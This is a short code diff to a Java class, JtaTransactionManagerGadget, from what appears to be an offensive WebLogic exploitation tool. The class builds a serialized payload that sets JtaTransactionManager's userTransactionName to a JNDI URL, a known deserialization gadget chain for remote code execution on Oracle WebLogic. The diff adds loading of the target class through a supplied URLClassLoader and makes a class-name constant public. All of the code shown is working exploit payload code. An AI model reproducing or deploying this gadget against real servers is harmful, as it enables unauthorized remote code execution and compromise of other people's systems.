@@ -4,9 +4,9 @@ import com.r4v3zn.weblogic.tools.annotation.Authors;
 import com.r4v3zn.weblogic.tools.annotation.Dependencies;
 import com.r4v3zn.weblogic.tools.gadget.ObjectPayload;
 import com.r4v3zn.weblogic.tools.utils.Gadgets;
-
 import java.io.Serializable;
 import java.lang.reflect.Field;
+import java.net.URLClassLoader;
 import java.rmi.Remote;
 
 /**
@@ -25,7 +25,7 @@ public class JtaTransactionManagerGadget implements ObjectPayload<Serializable> 
     /**
      * JtaTransactionManager Class Name
      */
-    private static final String JTATRANSACTIONMANAGER_CLASS_NAME = "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager";
+    public static final String JTATRANSACTIONMANAGER_CLASS_NAME = "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager";
 
     /**
      * 获取序列化 payload
@@ -34,8 +34,13 @@ public class JtaTransactionManagerGadget implements ObjectPayload<Serializable> 
      * @throws Exception
      */
     @Override
-    public Serializable getObject(String jndiUrl) throws Exception {
-        Class clazz = Class.forName(JTATRANSACTIONMANAGER_CLASS_NAME);
+    public Serializable getObject(String jndiUrl, URLClassLoader urlClassLoader) throws Exception {
+        Class clazz = null;
+        if (urlClassLoader == null){
+            clazz = Class.forName(JTATRANSACTIONMANAGER_CLASS_NAME);
+        }else{
+            clazz = urlClassLoader.loadClass(JTATRANSACTIONMANAGER_CLASS_NAME);
+        }
         Object object = clazz.newInstance();
         Field userTransactionName = clazz.getDeclaredField("userTransactionName");
         userTransactionName.setAccessible(true);
